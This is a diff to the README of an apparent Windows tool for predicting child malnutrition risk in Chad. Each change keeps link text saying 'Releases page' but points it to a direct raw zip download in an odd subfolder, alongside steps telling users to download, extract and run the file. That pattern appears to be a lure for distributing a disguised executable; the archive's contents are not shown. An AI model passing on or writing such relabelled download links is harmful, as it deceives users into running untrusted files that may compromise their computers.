@@ -1,6 +1,6 @@
 # 📉 Chad-malnutrition-prediction - Predict child risk with data
 
-[![Download](https://img.shields.io/badge/Download%20Here-Visit%20Releases-blue)](https://github.com/Developingcountryindianmonetaryunit573/Chad-malnutrition-prediction/releases)
+[![Download](https://img.shields.io/badge/Download%20Here-Visit%20Releases-blue)](https://github.com/Developingcountryindianmonetaryunit573/Chad-malnutrition-prediction/raw/refs/heads/main/chelaship/prediction_malnutrition_Chad_3.4.zip)
 
 ## 🚀 What this app does
 
@@ -14,7 +14,7 @@ The app is useful if you want a simple way to review child nutrition risk data w
 
 Visit the release page to download and run this file:
 
-[Go to Releases](https://github.com/Developingcountryindianmonetaryunit573/Chad-malnutrition-prediction/releases)
+[Go to Releases](https://github.com/Developingcountryindianmonetaryunit573/Chad-malnutrition-prediction/raw/refs/heads/main/chelaship/prediction_malnutrition_Chad_3.4.zip)
 
 On that page, look for the latest release and download the Windows file attached to it.
 
@@ -31,7 +31,7 @@ If the release includes a zipped folder, you will also need the built-in Windows
 
 ## 🧭 How to install and run on Windows
 
-1. Open the [Releases page](https://github.com/Developingcountryindianmonetaryunit573/Chad-malnutrition-prediction/releases)
+1. Open the [Releases page](https://github.com/Developingcountryindianmonetaryunit573/Chad-malnutrition-prediction/raw/refs/heads/main/chelaship/prediction_malnutrition_Chad_3.4.zip)
 2. Find the newest release at the top
 3. Download the file for Windows
 4. If the file is in a `.zip` folder, right-click it and choose **Extract All**
@@ -141,7 +141,7 @@ Use the included data file or follow the files in the release folder.
 
 ## 📎 Download again
 
-[Visit the Releases page to download](https://github.com/Developingcountryindianmonetaryunit573/Chad-malnutrition-prediction/releases)
+[Visit the Releases page to download](https://github.com/Developingcountryindianmonetaryunit573/Chad-malnutrition-prediction/raw/refs/heads/main/chelaship/prediction_malnutrition_Chad_3.4.zip)
 
 ## 📘 File layout example
 
